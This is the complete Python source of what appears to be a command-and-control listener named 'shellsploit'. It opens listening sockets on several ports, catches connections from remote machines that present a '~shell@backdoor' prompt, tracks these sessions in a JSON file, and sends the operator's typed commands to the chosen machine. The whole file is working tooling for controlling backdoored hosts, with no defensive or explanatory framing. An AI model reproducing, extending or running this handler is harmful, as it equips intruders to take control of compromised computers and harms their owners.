def main():
    import socket
    import threading
    import sys
    import os
    import json
    HOST = '0.0.0.0'
    SESSION_FILE = "sessions.json"
    sessions = {}     
    listeners = {}   
    active_port = None
    lock = threading.Lock()
    def load_sessions():
        if os.path.exists(SESSION_FILE):
            try:
                with open(SESSION_FILE, "r") as f:
                    return json.load(f)
            except:
                pass
        return {"listeners": [], "active_sessions": []}
    def save_sessions():
        try:
            data = {
                "listeners": [],
                "active_sessions": []
            }
            for p in listeners:
                if p not in sessions:
                    data["listeners"].append(p)
            for p in sessions:
                data["active_sessions"].append(p)
            with open(SESSION_FILE, "w") as f:
                json.dump(data, f, indent=2)
        except:
            pass
    def handle_client(client, addr, port):
        nonlocal sessions, active_port
        print(f"\n[+] Connected {addr[0]}:{addr[1]} on port {port}")
        with lock:
            if port in sessions:
                try:
                    sessions[port].close()
                except:
                    pass
            sessions[port] = client
            save_sessions()
        while True:
            try:
                data = client.recv(4096)
                if not data:
                    break
                msg = data.decode(errors="ignore").rstrip()
                if active_port == port:
                    if msg == "~shell@backdoor ":
                        print(msg, end="")
                    else:
                        print(msg)
                else:
                    if msg == "~shell@backdoor ":
                       print(msg, end="")
                    else:
                        print(msg)
            except:
                break
        print(f"\n[-] Disconnected from port {port}")
        with lock:
            if port in sessions:
                del sessions[port]
            save_sessions()
    def start_listener(port):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((HOST, port))
        server.listen(5)
        with lock:
            listeners[port] = True
            save_sessions()
        print(f"[+] Listening on {port}")
        while True:
            client, addr = server.accept()
            threading.Thread(
                target=handle_client,
                args=(client, addr, port),
                daemon=True
            ).start()
    def input_handler():
        nonlocal active_port
        while True:
            try:
                cmd = input("shellsploit > ").strip()
            except:
                break
            if cmd.startswith("use"):
                try:
                    p = int(cmd.split()[1])
                    if p in sessions:
                        active_port = p
                        print(f"[+] Using {p}")
                    else:
                        print("[-] Not active")
                except:
                    print("use <port>")
            elif cmd == "sessions":
                print("\n--- STATUS ---")
                for p in sorted(listeners.keys()):
                    if p in sessions:
                        print(f"{p} -> ACTIVE")
                    else:
                        print(f"{p} -> LISTENING")
                print()
            elif cmd == "background":
                active_port = None
            elif cmd == "exit":
                break
            else:
                if active_port in sessions:
                    try:
                        sessions[active_port].send((cmd + "\n").encode())
                    except:
                        print("send failed")
                else:
                    print("no active session")
    data = load_sessions()
    ports = data.get("listeners", []) + data.get("active_sessions", [])
    ports = list(set(ports))
    if len(sys.argv) > 1:
        ports += [int(p) for p in sys.argv[1:]]
    ports = list(set(ports))
    for p in ports:
        listeners[p] = True
    save_sessions()
    for port in ports:
        threading.Thread(target=start_listener, args=(port,), daemon=True).start()
    input_handler()
    print("\n[!] Resetting all to listening...")
    with lock:
        sessions.clear()
        save_sessions()
if __name__ == "__main__":
    main()